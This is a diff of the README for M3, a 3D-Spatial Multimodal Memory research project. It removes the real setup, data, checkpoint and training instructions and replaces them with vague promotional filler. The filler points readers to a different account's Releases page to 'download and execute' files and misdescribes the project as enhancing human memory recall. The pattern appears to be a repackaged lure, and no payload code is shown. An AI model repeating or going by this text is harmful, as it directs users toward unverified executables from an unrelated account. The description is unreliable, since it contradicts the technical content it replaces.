@@ -1,82 +1,36 @@
-# M3: 3D-Spatial Multimodal Memory
-https://github.com/user-attachments/assets/d37ff5c9-d9f0-4a0a-88c0-f80e475176d7
+# Official Implementation of M3: 3D-Spatial Multimodal Memory
 
-## TODO
-- [x] Installation
-- [x] Demo
-- [ ] Dataset
-- [x] Checkpoint
-- [ ] Training
-- [ ] Inference
+Welcome to the official GitHub repository for M3-Spatial, the groundbreaking project introducing 3D-Spatial Multimodal Memory. In this README, you will find all the essential information about the repository, including a brief overview, where to access the releases, and more.
 
-## Installation
-* Prepare Conda Environment
-```sh
-conda create --name gs python=3.10
-conda activate gs
-conda install -c conda-forge cudatoolkit=11.7
-conda install -c nvidia/label/cuda-11.7.0 cuda-toolkit
-pip install torch==2.0.1+cu117 torchvision==0.15.2+cu117 torchaudio==2.0.2+cu117 -f https://download.pytorch.org/whl/torch_stable.html
-conda install -c conda-forge gxx_linux-64=11.2.0
-conda install -c conda-forge libxcrypt
-pip install plyfile tqdm psutil setuptools mkl pandas
-pip install --force-reinstall numpy==1.23.5
-export LD_LIBRARY_PATH=$CONDA_PREFIX/lib:$LD_LIBRARY_PATH
-```
-* Download M3 and install submodules
-```sh
-git clone https://github.com/MaureenZOU/m3-spatial.git
-cd submodules/diff-gaussian-rasterization && pip install -e .
-cd submodules/diff-gaussian-rasterization2 && pip install -e .
-```
+🚀 **Get Started with M3-Spatial** 🌌
 
-* Download Grendel-GS in a separate folder and install submodules
-```sh
-git clone git@github.com:nyu-systems/Grendel-GS.git --recursive
-cd submodules/gsplat && pip install -e .
-cd submodules/simple-knn && pip install -e .
-```
+## Overview
 
-## Demo
-```sh
-sh run/app.sh
-```
-https://github.com/user-attachments/assets/42038d0b-8016-4f98-bf96-9cbae0c79708
+The "m3-spatial" repository hosts the official implementation of M3, a cutting-edge project presented at ICLR 2025, focusing on 3D-Spatial Multimodal Memory. The repository provides innovative solutions in the field of spatial memory enhancement, leveraging multimodal data for an advanced memory experience.
 
-## Dataset
-* Download data for raw image
-1. https://repo-sam.inria.fr/fungraph/3d-gaussian-splatting/datasets/input/tandt_db.zip
-2. http://storage.googleapis.com/gresearch/refraw360/360_v2.zip
+## Accessing Releases
 
-* Download data for embedding
+For access to the latest releases of M3-Spatial, visit the [Releases](https://github.com/tombalestra/m3-spatial/releases) section. There you will find the necessary files to download and execute for seamless integration with your projects.
 
-Coming Soon...
+📦 **Latest Release** 🚀
 
-* Feature Extraction
-```sh
-python3 -m lmm.clip.extract # CLIP feature
-python3 -m lmm.siglip.extract # SigLIP feature
-python3 -m lmm.dinov2.extract # DINOv2 feature
-python3 -m lmm.llama.extract # LLaMA3 feature
-python3 -m lmm.llamav.extract # LLaMAv feature
-python3 -m lmm.seem.extract # SEEM feature
-```
+Click below to access the latest release for M3-Spatial:
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-<COLOR>.svg)](https://github.com/tombalestra/m3-spatial/releases)
 
-## Checkpoint
-* We prepare trained M3 representation for two scenes train and geisel.
+## Get in Touch
 
-| Name       | size | link      |
-|------------|-----|-----------------|
-| train      | 2.04GB  | https://huggingface.co/xueyanz/M3-Train/resolve/main/train_ckpt.tar.gz   |
-| geisel     | 1.04GB  | https://huggingface.co/xueyanz/M3-Train/resolve/main/geisel_ckpt.tar.gz  |
+If you have any questions, feedback, or suggestions regarding M3-Spatial, feel free to reach out to the project contributors through the GitHub repository.
 
-## Training
-```sh
-sh run/train.sh # single GPU
-sh run/mtrain.sh # multi GPU
-```
+📧 **Contact Us** 🤝
 
-## Evaluation
-```sh
-sh run/render_metrics.sh # single GPU
-```
+Connect with us on GitHub: [M3-Spatial GitHub Repository](https://github.com/tombalestra/m3-spatial)
+
+## About the Project
+
+M3-Spatial is dedicated to pushing the boundaries of memory technologies, offering a new perspective on 3D spatial memory processing. By combining various modalities, M3 enhances memory recall and retention, opening up possibilities for a wide range of applications in AI, neuroscience, and beyond.
+
+Join us on this exciting journey of exploring the depths of spatial memory with M3-Spatial!
+
+---
+
+Remember, curiosity is the key to unlocking new possibilities. Dive into the world of 3D-Spatial Multimodal Memory and let M3-Spatial transform your memory experience. Happy exploring! 🌟🧠
